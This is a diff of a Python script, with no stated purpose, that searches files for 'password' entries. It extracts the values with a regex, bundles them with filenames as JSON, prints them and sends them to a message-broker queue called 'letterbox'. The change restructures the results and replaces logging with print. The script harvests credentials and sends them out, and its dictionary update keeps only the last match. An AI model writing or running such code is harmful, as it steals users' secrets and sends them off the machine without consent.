@@ -19,7 +19,7 @@ if __name__ == "__main__":
     string_to_match = "password"
 
     files = [i for i in data_path if os.path.isfile(i)]
-    final_files = {}
+    final_files = {"passwords": {}}
 
     def get_password():
         for file in files:
@@ -30,14 +30,16 @@ if __name__ == "__main__":
                     pattern_to_find = re.findall(r"password\S ([^\n]*)", output)
                     # Convert list to string and remove quotes
                     match = str(pattern_to_find)[1:-1].strip("'")
-                    final_files.update({"password": match, "filename": file})
-
+                    final_files["passwords"].update(
+                        {"password": match, "filename": file}
+                    )
         return final_files
 
     password = get_password()
     # Convert into a json string
     password_to_json = json.dumps(password)
-    logger.info(password_to_json)
+    print(password_to_json)
+    # logger.info(password_to_json)
     try:
         messageBroker.sendMessage("letterbox", password_to_json)
         print("Password was sent!")
